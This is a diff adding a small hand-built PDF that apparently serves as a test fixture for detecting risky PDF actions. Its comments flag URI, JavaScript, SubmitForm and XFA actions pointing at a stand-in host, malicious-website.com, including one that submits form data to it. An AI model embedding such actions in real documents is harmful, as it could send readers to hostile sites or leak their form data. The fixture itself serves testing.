@@ -1,0 +1,77 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog
+   /Pages 2 0 R
+>>
+endobj
+2 0 obj
+<< /Type /Pages
+   /Kids [3 0 R]
+   /Count 1
+>>
+endobj
+3 0 obj
+<< /Type /Page
+   /MediaBox [0 0 612 792]
+   /Contents 4 0 R
+   /Resources << /Font << /F1 5 0 R >> >>
+>>
+endobj
+4 0 obj
+<< /Length 44 >>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(This PDF contains a URI action that opens a website) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font
+   /Subtype /Type1
+   /BaseFont /Helvetica
+>>
+endobj
+
+% Non-compliant URI action
+% This action opens a potentially malicious URI
+6 0 obj
+<< /S /URI /URI (http://malicious-website.com) >>
+endobj
+
+% Non-compliant JavaScript action
+% This JavaScript could execute harmful code
+7 0 obj
+<< /S /JavaScript /JS (app.alert('This is a malicious script!');) >>
+endobj
+
+% Non-compliant SubmitForm action
+% This action submits form data to an external server
+8 0 obj
+<< /S /SubmitForm /F (http://malicious-website.com/submit) >>
+endobj
+
+% Non-compliant XFA form action
+% This action is associated with an XFA form
+9 0 obj
+<< /S /XFA /XFA (http://malicious-website.com/xfa) >>
+endobj
+
+xref
+0 10
+0000000000 65535 f 
+0000000010 00000 n 
+0000000070 00000 n 
+0000000170 00000 n 
+0000000270 00000 n 
+0000000320 00000 n 
+0000000370 00000 n 
+0000000420 00000 n 
+0000000470 00000 n 
+0000000520 00000 n 
+trailer
+<< /Size 10 /Root 1 0 R >>
+startxref
+600
+%%EOF
